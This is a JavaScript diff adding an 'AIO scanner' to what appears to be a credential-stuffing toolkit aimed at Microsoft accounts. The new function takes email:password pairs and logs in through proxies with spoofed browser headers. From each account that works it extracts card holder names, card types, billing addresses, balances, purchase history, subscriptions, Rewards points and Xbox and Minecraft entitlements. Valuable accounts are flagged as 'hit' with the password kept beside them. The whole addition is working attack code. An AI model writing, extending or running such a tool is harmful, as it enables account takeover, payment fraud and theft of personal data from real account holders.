@@ -1010,6 +1010,302 @@ async function scanLinkedServices(accounts, threads = 10, onProgress, signal) {
 }
 
 
+// ════════════════════════════════════════════════════════════
+//  8. AIO SCANNER — Single login, all scans combined
+// ════════════════════════════════════════════════════════════
+
+async function aioScan(accounts, threads = 10, onProgress, signal) {
+  const results = await runPool({
+    items: accounts,
+    concurrency: threads,
+    maxRetries: 1,
+    signal,
+    scope: "beta-aio",
+    runner: async (cred, ctx) => {
+      const sep = cred.indexOf(":");
+      if (sep < 0) return { result: { status: "fail", user: cred, reason: "Bad format" } };
+      const email = cred.slice(0, sep);
+      const password = cred.slice(sep + 1);
+
+      // ── Single login for everything ──
+      const login = await loginAccount(email, password, ctx.signal);
+      if (!login.ok) return { result: { status: "fail", user: email, reason: login.reason } };
+
+      const { token, jar } = login;
+      const apiHeaders = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
+        "Accept": "application/json",
+        "Authorization": `MSADELEGATE1.0="${token}"`,
+        "Origin": "https://account.microsoft.com",
+        "Referer": "https://account.microsoft.com/",
+        "Content-Type": "application/json",
+        Cookie: jar.header(),
+      };
+
+      // ── Run all 4 scans in parallel on same session ──
+      const [receiptData, paymentData, entitleData, bridgeData] = await Promise.allSettled([
+        // 1. Receipts
+        (async () => {
+          const receipts = [];
+          let cards = [];
+          try {
+            const txRes = await proxiedFetch(
+              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
+              { headers: apiHeaders, signal: ctx.signal }
+            );
+            const txText = await txRes.text();
+            const txMatches = txText.match(/"title":"[^"]*"/g) || [];
+            const amountMatches = txText.match(/"totalAmount":\s*[\d.]+/g) || [];
+            const dateMatches = txText.match(/"transactionDate":"[^"]*"/g) || [];
+            const currencyMatches = txText.match(/"currency":"[^"]*"/g) || [];
+            for (let i = 0; i < txMatches.length; i++) {
+              receipts.push({
+                title: txMatches[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A",
+                amount: amountMatches[i]?.replace(/"totalAmount":\s*/, "") || "0",
+                date: dateMatches[i]?.replace(/"transactionDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
+                currency: currencyMatches[i]?.replace(/"currency":"/, "").replace(/"$/, "") || "",
+              });
+            }
+          } catch {}
+          try {
+            const piRes = await proxiedFetch(
+              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
+              { headers: apiHeaders, signal: ctx.signal }
+            );
+            const piText = await piRes.text();
+            const cardNames = piText.match(/"display":\{"name":"[^"]*"/g) || [];
+            const cardTypes = piText.match(/"paymentMethodFamily":"[^"]*"/g) || [];
+            for (let i = 0; i < cardNames.length; i++) {
+              cards.push({
+                name: cardNames[i]?.replace(/"display":\{"name":"/, "").replace(/"$/, "") || "?",
+                type: cardTypes[i]?.replace(/"paymentMethodFamily":"/, "").replace(/"$/, "") || "?",
+              });
+            }
+          } catch {}
+          return { receipts, cards, totalSpent: receipts.reduce((s, r) => s + parseFloat(r.amount || 0), 0).toFixed(2) };
+        })(),
+
+        // 2. Payment Arsenal
+        (async () => {
+          let balance = "0", ccInfo = "N/A", address = "N/A", paymentMethods = [], subscriptions = [], points = "0";
+          try {
+            const r1 = await proxiedFetch(
+              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
+              { headers: apiHeaders, signal: ctx.signal }
+            );
+            const src1 = await r1.text();
+            balance = parseLR(src1, 'balance":', ',"') || "0";
+            const cardHolder = parseLR(src1, 'accountHolderName":"', '","') || "N/A";
+            const cardDisplay = parseLR(src1, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
+            const zipcode = parseLR(src1, '"postal_code":"', '",') || "N/A";
+            const region = parseLR(src1, '"region":"', '",') || "N/A";
+            const addr1 = parseLR(src1, '{"address_line1":"', '",') || "N/A";
+            const city = parseLR(src1, '"city":"', '",') || "N/A";
+            const country = parseLR(src1, '"country":"', '"') || "N/A";
+            ccInfo = `${cardHolder} | ${cardDisplay}`;
+            address = `${addr1}, ${city}, ${region} ${zipcode}, ${country}`;
+            const pmFamilies = src1.match(/"paymentMethodFamily":"[^"]*"/g) || [];
+            const pmNames = src1.match(/"display":\{"name":"[^"]*"/g) || [];
+            const pmStatuses = src1.match(/"status":"[^"]*"/g) || [];
+            for (let i = 0; i < pmFamilies.length; i++) {
+              paymentMethods.push({
+                type: pmFamilies[i]?.replace(/"paymentMethodFamily":"/, "").replace(/"$/, "") || "?",
+                name: pmNames[i]?.replace(/"display":\{"name":"/, "").replace(/"$/, "") || "?",
+                status: pmStatuses[i]?.replace(/"status":"/, "").replace(/"$/, "") || "?",
+              });
+            }
+          } catch {}
+          try {
+            const r2 = await proxiedFetch(
+              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
+              { headers: apiHeaders, signal: ctx.signal }
+            );
+            const src2 = await r2.text();
+            const subTitles = src2.match(/"title":"[^"]*"/g) || [];
+            const subRenews = src2.match(/"autoRenew":\s*(true|false)/g) || [];
+            const subNextBill = src2.match(/"nextRenewalDate":"[^"]*"/g) || [];
+            for (let i = 0; i < Math.min(subTitles.length, 10); i++) {
+              subscriptions.push({
+                title: subTitles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "?",
+                autoRenew: subRenews[i]?.includes("true") || false,
+                nextBilling: subNextBill[i]?.replace(/"nextRenewalDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
+              });
+            }
+          } catch {}
+          try {
+            const r3 = await proxiedFetch("https://rewards.bing.com/", {
+              headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", Cookie: jar.header() },
+              signal: ctx.signal,
+            });
+            points = parseLR(await r3.text(), ',"availablePoints":', ',"') || "0";
+          } catch {}
+          return { balance, ccInfo, address, paymentMethods, subscriptions, points };
+        })(),
+
+        // 3. Entitlements
+        (async () => {
+          let entitlements = [];
+          try {
+            const r1 = await proxiedFetch(
+              "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
+              { headers: apiHeaders, signal: ctx.signal }
+            );
+            const src1 = await r1.text();
+            const titles = src1.match(/"title":"[^"]*"/g) || [];
+            const amounts = src1.match(/"totalAmount":\s*[\d.]+/g) || [];
+            const dates = src1.match(/"startDate":"[^"]*"/g) || [];
+            const currencies = src1.match(/"currency":"[^"]*"/g) || [];
+            for (let i = 0; i < titles.length; i++) {
+              entitlements.push({
+                title: titles[i]?.replace(/"title":"/, "").replace(/"$/, "") || "N/A",
+                amount: parseFloat(amounts[i]?.replace(/"totalAmount":\s*/, "") || "0"),
+                date: dates[i]?.replace(/"startDate":"/, "").replace(/"$/, "").split("T")[0] || "N/A",
+                currency: currencies[i]?.replace(/"currency":"/, "").replace(/"$/, "") || "",
+              });
+            }
+          } catch {}
+          return { entitlements, totalValue: entitlements.reduce((s, e) => s + e.amount, 0).toFixed(2) };
+        })(),
+
+        // 4. Linked Services (Xbox)
+        (async () => {
+          const services = {};
+          try {
+            const xblOauth = "https://login.live.com/oauth20_authorize.srf" +
+              "?client_id=0000000048093EE3" +
+              "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
+              "&response_type=token" +
+              "&scope=service%3A%3Auser.auth.xboxlive.com%3A%3AMBI_SSL" +
+              "&prompt=none";
+            const { finalUrl: xUrl } = await sessionFetch(xblOauth, {
+              headers: {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+                "Accept": "text/html,*/*",
+                "Referer": "https://login.live.com/",
+              },
+            }, jar, ctx.signal);
+            const rpsToken = decodeURIComponent(parseLR(xUrl, "access_token=", "&token_type") || "");
+            if (!rpsToken) throw new Error("no rps");
+
+            const xblRes = await proxiedFetch("https://user.auth.xboxlive.com/user/authenticate", {
+              method: "POST",
+              headers: { "Content-Type": "application/json", "x-xbl-contract-version": "1" },
+              body: JSON.stringify({
+                RelyingParty: "http://auth.xboxlive.com",
+                TokenType: "JWT",
+                Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: `d=${rpsToken}` },
+              }),
+              signal: ctx.signal,
+            });
+            const xblData = await xblRes.json();
+            const uhs = xblData.DisplayClaims?.xui?.[0]?.uhs || "";
+
+            const xstsRes = await proxiedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                RelyingParty: "http://xboxlive.com",
+                TokenType: "JWT",
+                Properties: { UserTokens: [xblData.Token], SandboxId: "RETAIL" },
+              }),
+              signal: ctx.signal,
+            });
+            const xstsData = await xstsRes.json();
+            const xblAuth = `XBL3.0 x=${uhs};${xstsData.Token}`;
+            const xHeaders = { "Authorization": xblAuth, "x-xbl-contract-version": "2", "Accept": "application/json" };
+
+            // Xbox Profile
+            try {
+              const profRes = await proxiedFetch(
+                `https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,AccountTier`,
+                { headers: xHeaders, signal: ctx.signal }
+              );
+              if (profRes.ok) {
+                const profData = await profRes.json();
+                const s = profData.profileUsers?.[0]?.settings || [];
+                services.Xbox = {
+                  linked: true,
+                  gamertag: s.find(x => x.id === "Gamertag")?.value || "N/A",
+                  gamerscore: s.find(x => x.id === "Gamerscore")?.value || "0",
+                  tier: s.find(x => x.id === "AccountTier")?.value || "N/A",
+                };
+              }
+            } catch {}
+
+            // Game Pass
+            try {
+              const gpRes = await proxiedFetch(
+                "https://emerald.xboxservices.com/xboxcomfd/v3/offers?market=US&language=en-US",
+                { headers: { ...xHeaders, "x-xbl-contract-version": "4" }, signal: ctx.signal }
+              );
+              if (gpRes.ok) {
+                const gpData = await gpRes.json();
+                const offers = gpData.offers || gpData.Offers || [];
+                services.GamePass = { linked: offers.length > 0, offerCount: offers.length };
+              }
+            } catch {}
+
+            // Title History (Minecraft, EA)
+            try {
+              const mcRes = await proxiedFetch(
+                "https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/achievement,stats",
+                { headers: { ...xHeaders, "x-xbl-contract-version": "2" }, signal: ctx.signal }
+              );
+              if (mcRes.ok) {
+                const mcData = await mcRes.json();
+                const titles = mcData.titles || [];
+                const mc = titles.find(t => (t.name || "").toLowerCase().includes("minecraft") || t.titleId === "1739947436");
+                services.Minecraft = { linked: !!mc, title: mc?.name || "N/A" };
+                const ea = titles.find(t => (t.name || "").toLowerCase().includes("ea play"));
+                services.EAPlay = { linked: !!ea };
+                services.Library = { totalGames: titles.length };
+              }
+            } catch {}
+          } catch {}
+
+          // Rewards
+          try {
+            const rwRes = await proxiedFetch("https://rewards.bing.com/", {
+              headers: { "User-Agent": DESKTOP_UA, Cookie: jar.header() },
+              signal: ctx.signal,
+            });
+            services.Rewards = { linked: true, points: parseLR(await rwRes.text(), ',"availablePoints":', ',"') || "0" };
+          } catch {}
+
+          return { services, linkedCount: Object.values(services).filter(s => s?.linked).length };
+        })(),
+      ]);
+
+      const receipt = receiptData.status === "fulfilled" ? receiptData.value : { receipts: [], cards: [], totalSpent: "0" };
+      const payment = paymentData.status === "fulfilled" ? paymentData.value : { balance: "0", ccInfo: "N/A", address: "N/A", paymentMethods: [], subscriptions: [], points: "0" };
+      const entitle = entitleData.status === "fulfilled" ? entitleData.value : { entitlements: [], totalValue: "0" };
+      const bridge = bridgeData.status === "fulfilled" ? bridgeData.value : { services: {}, linkedCount: 0 };
+
+      const hasContent = receipt.receipts.length > 0 || payment.paymentMethods.length > 0 ||
+        parseFloat(payment.balance) > 0 || entitle.entitlements.length > 0 || bridge.linkedCount > 0 ||
+        (payment.ccInfo !== "N/A" && payment.ccInfo !== "N/A | N/A");
+
+      return {
+        result: {
+          status: hasContent ? "hit" : "empty",
+          user: email,
+          password,
+          receipt,
+          payment,
+          entitle,
+          bridge,
+        },
+      };
+    },
+    onResult: (r, done, total) => {
+      if (onProgress) onProgress(done, total, r);
+    },
+  });
+
+  return results.filter(Boolean);
+}
+
+
 module.exports = {
   snipeRegionalPrices,
   ghostRedeemCodes,
@@ -1018,4 +1314,5 @@ module.exports = {
   scanEntitlements,
   farmRewards,
   scanLinkedServices,
+  aioScan,
 };
